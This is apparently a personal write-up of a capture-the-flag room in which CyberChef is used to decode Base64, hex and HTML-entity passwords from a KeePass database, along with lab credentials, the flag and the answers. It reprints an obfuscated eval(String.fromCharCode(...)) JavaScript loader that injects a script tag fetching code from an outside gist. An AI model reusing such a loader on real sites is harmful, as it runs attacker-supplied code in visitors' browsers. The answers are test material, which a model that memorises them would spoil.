DAY 22 - ELF MCEAGER BECOMES CYBERELF [BLUE TEAMING]
----

# STORY :
----

>>The past few days there have been strange things happening at Best Festival Company. McEager hasn't had the time to fully investigate the compromised endpoints with everything that is going on nor does he have the time to reimage the workstations. McEager decides to log into a different workstation, one of his backup systems.

>>McEager logs in and to his dismay he can't log into his password manager. It's not accepting his master key! He notices that the folder name has been renamed to something strange.

>>Task: You must gain access to the password manager and decode the values within the password manager using CyberChef.

----

# CREDS :
----

>>For Server provide (MACHINE_IP) as the IP address provided to you for the remote machine. The credentials for the user account is:
   * User name: Administrator
   * User password: sn0wF!akes!!!

----

# TASKS
----

>>Password managers are the norm these days. There are many cloud-based password managers but there also are password managers you run locally on your endpoint, such as KeePass. KeePass is an executable that allows you to store all types of data, including passwords, in a password-protected database. The official definition of KeePass from its website:

>>"Today, you have to remember many passwords. You need a password for a lot of websites, your e-mail account, your webserver, network logins, etc. The list is endless. Also, you should use a different password for each account, because if you would use only one password everywhere and someone gets this password, you would have a problem: the thief would have access to all of your accounts. KeePass is a free open source password manager, which helps you to manage your passwords in a secure way. You can store all your passwords in one database, which is locked with a master key. So you only have to remember one single master key to unlock the whole database."

>>Now with that out of the way, open the strange-looking folder name on the desktop and run KeePass. You will be prompted to enter the master password. If you enter the phrase mceagerrockstar you will see a message stating that the key is invalid.

>>Looking back at the folder name it looks cryptic, like some sort of encoding. Encryption and encoding are familiar techniques used in IT, especially within Computer Security. Malware writers use some of these encoding techniques to hide their malicious code. Some encodings are quickly identifiable and some are not.

>>You can use CyberChef to decrypt/decode the encrypted/encoded values that you will encounter within this endpoint. CyberChef is the self-purported 'Cyber Swiss-Army Knife' created by GCHQ. It's a fantastic tool for data transformation, extraction & manipulation in your web-browser. CyberChef uses recipes to perform this magic.

>>Speaking of 'magic', you can use the Magic recipe to decode the folder name. There is a local copy of CyberChef (C:\Tools) on the endpoint.

>>To use a recipe simply drag and drop it into the Recipe window. Auto Bake should be checked of which will automatically run the recipe against the encoded value. If it is not checked, simply press BAKE!

>>Now that you have unlocked KeePass, you should see that there are more encodings within the KeePass database file. Take a close look at the Notes for each entry. They will provide clues on how to decode them. Some of the popular encodings are listed under Favourites. (HINT)

>>Note: To view the Password entries, click on the ellipsis [...].

>>Malware writers perform various iterations of encoding to frustrate the reverse engineering process. With that being said, one of the encoded values will require you to run the duplicate recipe 2x to get the fully decoded value. (HINT)

----

# MY DOCUMENTATION :
----

>>THIS HASH VALUE IS TAKEN FROM THE "ELF SERVER" CREDENTIALS STORED IN THE NETWORK FOLDER. 
>>TO DECODE THIS GO TO CYBERCHEF AND USE MAGIC RECIPE.
```PASSWORD_FROM_ELF_SERVER_IN_NETWORK_FOLDER
ENCODED VALUE:

dGhlZ3JpbmNod2FzaGVyZQ==

DECODED RESULTS:            
                From_Base64('A-Za-z0-9+/=',true)
                	thegrinchwashere      Possible languages:
                                     	   English
                                     	   German
                                     	   Dutch
                                     	   Indonesian
                                     	   Matching ops: From Base64
                                     	   Valid UTF8
                                     	   Entropy: 3.28
            

                From_Base64('A-Za-z0-9+\\-=',true)
                	thegrinchwashere	   Possible languages:   
											English
											German
											Dutch
											Indonesian
											Matching ops: From Base64
											Valid UTF8
											Entropy: 3.28
                        
                	dGhlZ3JpbmNod2FzaGVyZQ==
                 	Matching ops: From Base64
					Valid UTF8
					Entropy: 4.25
```

>>THIS HASH VALUE IS TAKEN FROM THE "ELF MAIL" CREDENTIALS STORED IN THE EMAIL FOLDER. 
>>TO DECODE THIS GO TO CYBERCHEF AND USE MAGIC RECIPE.
```PASSWORD_FROM_ELF_MAIL_IN_EMAIL
ENCODED VALUE:

736e30774d346e21

DECODED RESULTS:
               		From_Hex('None')

                	sn0wM4n!
                	Valid UTF8
					Entropy: 2.75
                
                	736e30774d346e21
                	Matching ops: From Base64, From Hex, From Hexdump
					Valid UTF8
					Entropy: 3.03

ENCODED VALUE:

&#105;&#99;&#51;&#83;&#107;&#97;&#116;&#105;&#110;&#103;&excl;

DECODED RESULTS:
                From_HTML_Entity()

                	ic3Skating!
                	Valid UTF8
					Entropy: 3.28
                
                	&#105;&#99;&#51;&#83;&#107;&#97;&#116;&#105;&#110;&#103;&excl;
                	Matching ops: From HTML Entity
					Valid UTF8
					Entropy: 3.33
```

>>THIS EVAL STRINGS ARE TAKEN FROM THE "ELF SECURITY TEAM" CREDENTIALS STORED IN THE RECYCLE BIN FOLDER. 
>>TO DECODE THIS GO TO CYBERCHEF AND ADD THE RECIPE NAME "FROM CHARCODE" AND SET THE DELIMETER VALUE TO COMMA AND BASE VALUE TO 10.
>>THE DECODED VALUE IS THE URL GO TO THAT URL TO GET THE FLAG.
```NOTES_FROM_ELF_SECURITY_TEAM_IN_RECYCLE_BIN 
ENCODED VALUE:

eval(String.fromCharCode(118, 97, 114, 32, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 32, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 46, 116, 121, 112, 101, 32, 61, 32, 39, 116, 101, 120, 116, 47, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 39, 59, 32, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 46, 97, 115, 121, 110, 99, 32, 61, 32, 116, 114, 117, 101, 59, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 46, 115, 114, 99, 32, 61, 32, 83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 49, 48, 52, 44, 32, 49, 48, 52, 44, 32, 49, 49, 54, 44, 32, 49, 49, 54, 44, 32, 49, 49, 50, 44, 32, 49, 49, 53, 44, 32, 53, 56, 44, 32, 52, 55, 44, 32, 52, 55, 44, 32, 49, 48, 51, 44, 32, 49, 48, 53, 44, 32, 49, 49, 53, 44, 32, 49, 49, 54, 44, 32, 52, 54, 44, 32, 49, 48, 51, 44, 32, 49, 48, 53, 44, 32, 49, 49, 54, 44, 32, 49, 48, 52, 44, 32, 49, 49, 55, 44, 32, 57, 56, 44, 32, 52, 54, 44, 32, 57, 57, 44, 32, 49, 49, 49, 44, 32, 49, 48, 57, 44, 32, 52, 55, 44, 32, 49, 48, 52, 44, 32, 49, 48, 49, 44, 32, 57, 55, 44, 32, 49, 49, 56, 44, 32, 49, 48, 49, 44, 32, 49, 49, 48, 44, 32, 49, 49, 52, 44, 32, 57, 55, 44, 32, 49, 48, 53, 44, 32, 49, 50, 50, 44, 32, 57, 55, 44, 32, 52, 55, 41, 59, 32, 32, 32, 118, 97, 114, 32, 97, 108, 108, 115, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 32, 118, 97, 114, 32, 110, 116, 51, 32, 61, 32, 116, 114, 117, 101, 59, 32, 102, 111, 114, 32, 40, 32, 118, 97, 114, 32, 105, 32, 61, 32, 97, 108, 108, 115, 46, 108, 101, 110, 103, 116, 104, 59, 32, 105, 45, 45, 59, 41, 32, 123, 32, 105, 102, 32, 40, 97, 108, 108, 115, 91, 105, 93, 46, 115, 114, 99, 46, 105, 110, 100, 101, 120, 79, 102, 40, 83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 52, 57, 44, 32, 52, 57, 44, 32, 49, 48, 48, 44, 32, 53, 49, 44, 32, 53, 48, 44, 32, 52, 57, 44, 32, 53, 48, 44, 32, 53, 50, 44, 32, 53, 50, 44, 32, 57, 57, 44, 32, 53, 50, 44, 32, 49, 48, 48, 44, 32, 53, 52, 44, 32, 53, 52, 44, 32, 53, 53, 44, 32, 53, 50, 44, 32, 53, 50, 44, 32, 53, 52, 44, 32, 49, 48, 48, 44, 32, 57, 56, 44, 32, 49, 48, 50, 44, 32, 49, 48, 48, 44, 32, 53, 55, 44, 32, 57, 55, 44, 32, 53, 49, 44, 32, 53, 48, 44, 32, 53, 55, 44, 32, 53, 54, 44, 32, 57, 55, 44, 32, 53, 54, 44, 32, 53, 54, 44, 32, 57, 56, 44, 32, 53, 54, 41, 41, 32, 62, 32, 45, 49, 41, 32, 123, 32, 110, 116, 51, 32, 61, 32, 102, 97, 108, 115, 101, 59, 125, 32, 125, 32, 105, 102, 40, 110, 116, 51, 32, 61, 61, 32, 116, 114, 117, 101, 41, 123, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 40, 34, 104, 101, 97, 100, 34, 41, 91, 48, 93, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 41, 59, 32, 125));

DECODED RESULTS :
.https://gist.github.com/heavenraiza/1d321244c4d667446dbfd9a3298a88b8
```

>>FLAG IN THAT URL.
```
cyberelf
THM{657012dcf3d1318dca0ed864f0e70535}
```

----

# ANSWER THE FOLLOWING :
----

What is the password to the KeePass database?
>>thegrinchwashere

What is the encoding method listed as the 'Matching ops'?
>>Base64

What is the decoded password value of the Elf Server?
>>sn0wM4n!

What is the decoded password value for ElfMail?
>>ic3Skating!

Decode the last encoded value. What is the flag?
>>THM{657012dcf3d1318dca0ed864f0e70535}

----